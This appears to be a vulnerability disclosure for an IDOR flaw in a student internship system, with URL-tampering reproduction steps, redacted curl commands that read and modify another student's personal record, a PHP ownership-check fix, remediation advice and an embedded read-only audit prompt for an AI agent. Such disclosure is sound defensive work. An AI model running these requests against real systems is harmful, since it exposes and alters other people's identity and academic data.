---
title: "Broken Access Control (IDOR) on Student Internship Information System"
date: 2026-06-17
author: "Alexander Agung Raya"
severity: "Critical"
cwe: "CWE-639"
owasp: "OWASP A01"
tags: ["IDOR", "Broken Access Control", "Web Security", "Authorization Bypass"]
pdf: "/reports/IDOR-Polinema-SIMMAGANG-2026.pdf"
summary: "Authenticated students could read and modify other students' records by changing the ID parameter in the URL."
recommendedActions:
  - title: "Scope every lookup to the authenticated user"
    detail: "Never resolve a record from the client-supplied key alone. Add the owner to the query so a foreign ID simply finds nothing."
  - title: "Cover writes, not just reads"
    detail: "The edit form and the update handler need the same check. A read-only fix still leaves document replacement open."
  - title: "Authorise in one place"
    detail: "Use a policy or a route-model binding scope so new endpoints inherit the rule instead of re-implementing it."
  - title: "Fail closed, and do not confirm existence"
    detail: "Return 404 for records the caller does not own, so the response cannot be used to enumerate valid IDs."
  - title: "Replace guessable identifiers"
    detail: "Sequential integers invite enumeration. Prefer UUIDs or signed URLs for anything a user can see in the address bar."
  - title: "Lock it in with a regression test"
    detail: "One test per protected route: authenticate as user A, request user B's record, assert 403 or 404."
fix:
  lang: php
  code: |
    // app/Http/Controllers/PendaftarController.php
    public function show(string $id)
    {
        // Before: the row is fetched by the client-supplied key.
        $magang = Magang::findOrFail($id);

        // After: the row is scoped to the authenticated student.
        $magang = Magang::where('user_id', auth()->id())
            ->findOrFail($id);

        return view('pendaftar.show', compact('magang'));
    }
prompt: |
  You are auditing a web application for broken access control (IDOR, CWE-639).
  Work read-only: report what you find, change nothing.

  Target
  - Application: Student Internship Information System (Laravel / PHP / MySQL)
  - Bug class: an authenticated user can read or modify another user's record by
    changing an object identifier in the URL, query string, or request body.
  - Known-vulnerable shape: GET /mw/pendaftar/proses/pr1/{id} returns the record
    for {id} with no ownership check.

  What to do
  1. Enumerate every route, controller action, and API endpoint that accepts an
     identifier (path segment, query parameter, form field, JSON body key) and
     resolves it to a database record.
  2. For each one, state where authorization happens: middleware, policy, gate,
     query scope, or nowhere.
  3. Flag any handler that fetches by primary key and then renders or mutates the
     record without comparing it to the authenticated principal.
  4. Check the same handler for mass assignment on update: which fields are
     fillable, and can a request set user_id, role, or ownership columns?
  5. Look for indirect references that are guessable (sequential integers,
     timestamps, short hashes) rather than unguessable.

  Report back
  - A table: endpoint, HTTP method, identifier, current check, verdict
    (protected / unverified / exposed).
  - For each exposed endpoint: the smallest server-side fix, as a diff.
  - The regression test that would have caught it, written against the existing
    test suite.
  - Anything you could not verify, and what you would need to verify it.
---

## **Executive Summary**

A critical **Insecure Direct Object Reference (IDOR)** vulnerability was discovered in the Student Internship Information System's internship registration module. The flaw enables authenticated users to access, view, and potentially modify other students' personal data — including National Identity Numbers, academic records, and supporting documents — by simply altering the ID parameter in the URL. This represents a severe breach of access control that compromises the confidentiality and integrity of student data across the platform.

| Severity | Category | Impact Scope |
|----------|----------|-------------|
| **Critical** | Broken Access Control | All registered students |

---

## **Finding Information**

| Field | Value |
|-------|-------|
| **Title** | Broken Access Control (IDOR) on Student Internship Information System |
| **Discovery Date** | June 17, 2026 |
| **Discovered By** | Alexander Agung Raya |
| **Risk Severity** | High / Critical |

---

## **Summary**

A Broken Access Control (IDOR) vulnerability was discovered in the internship registration module. Authenticated users can access other students' data by simply modifying the ID parameter in the URL.

### Exposed Data Fields

- Full Name
- Student ID (NIM)
- National Identity Number (NIK)
- GPA (IPK)
- Department
- Study Program
- City/Regency
- Supporting Documents
- Internship Company Information

---

## **Affected URL**

**Example:**

```
https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_XXXXX]
```

When the parameter is modified to:

```
https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_YYYYY]
```

The system displays another student's data.

---

## **Reproduction Steps**

### Step 1

Log in using a valid student account.

### Step 2

Navigate to the personal internship data page.

```
https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_XXXXX]
```

### Step 3

Modify the ID parameter in the URL to a different ID.

**Example:**

```
https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_YYYYY]
```

### Step 4

Press Enter.

---

## **Results**

| | Description |
|---|---|
| **Actual Result** | Another student's data is accessible. |
| **Expected Result** | The system should deny access (403 Forbidden), display a not found page (404), or ensure only the data owner can access their data. |
---

## **Impact**

Potential exposure of student personal data:

- Full Name
- Student ID (NIM)
- National Identity Number (NIK)
- Academic Information
- Supporting Documents

If the edit function is also exploitable, an attacker could:

- Modify other students' data
- Replace uploaded documents
- Compromise the integrity of internship registration data

---

## **Evidence**

Screenshots are pending; the following commands reproduce the issue end-to-end. The host, session identifier, and all personal values are redacted.

> **Note:** Route suffixes and parameter names are illustrative and may differ from the live platform.

```bash
# 1. Personal data of the authenticated user
curl -s "https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_XXXXX]" \
  -b "laravel_session=[REDACTED]"
# Response: HTTP/1.1 200 OK — the user's own personal data is returned
```

```bash
# 2. Another student's data accessed by changing the URL ID
curl -s "https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_YYYYY]" \
  -b "laravel_session=[REDACTED]"
# Response: HTTP/1.1 200 OK — another student's personal data is returned
```

```bash
# 3. Edit form rendered for another student's data
curl -s "https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_YYYYY]/edit" \
  -b "laravel_session=[REDACTED]"
# Response: HTTP/1.1 200 OK — edit form is accessible without an ownership check
```

```bash
# 4. Editing another student's data
curl -s -X POST "https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_YYYYY]" \
  -b "laravel_session=[REDACTED]" \
  -d "nama=[REDACTED]&nik=[REDACTED]&ipk=[REDACTED]"
# Response: HTTP/1.1 200 OK — the submitted changes are accepted
```

```bash
# 5. Modified data appears in the attacker's registration list
curl -s "https://[REDACTED]/mw/pendaftar/proses/pr1" \
  -b "laravel_session=[REDACTED]"
```

```bash
# 6. The record now belongs to the attacker (originally another student's)
curl -s "https://[REDACTED]/mw/pendaftar/proses/pr1/[ID_YYYYY]" \
  -b "laravel_session=[REDACTED]"
```

> **Note:** Sensitive personal information has been redacted for privacy.

---

## **Classification**

| Classification | Description |
|----------------|-------------|
| **CWE** | CWE-639: Authorization Bypass Through User-Controlled Key |
| **Category** | IDOR (Insecure Direct Object Reference) |
| **OWASP** | OWASP A01: Broken Access Control |

---

## **Impact Summary**

An authenticated student can access other students' data without authorization by modifying URL parameters.

### Exposed Data

- National Identity Number (NIK)
- Student ID (NIM)
- Academic Records
- Supporting Documents
- Internship Information

---

## **Conclusion**

A Broken Access Control (IDOR) vulnerability was discovered that allows authenticated users to access other students' data by modifying URL parameters. It is recommended that the system implement authorization checks on every data access request to prevent unauthorized access.

---

## **References**

| Reference | Description | Link |
|-----------|-------------|------|
| **CWE-639** | Authorization Bypass Through User-Controlled Key | [cwe.mitre.org](https://cwe.mitre.org/data/definitions/639.html) |
| **OWASP A01** | Broken Access Control | [owasp.org](https://owasp.org/Top10/A01_2021-Broken_Access_Control/) |
| **OWASP IDOR** | Insecure Direct Object Reference Prevention | [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) |
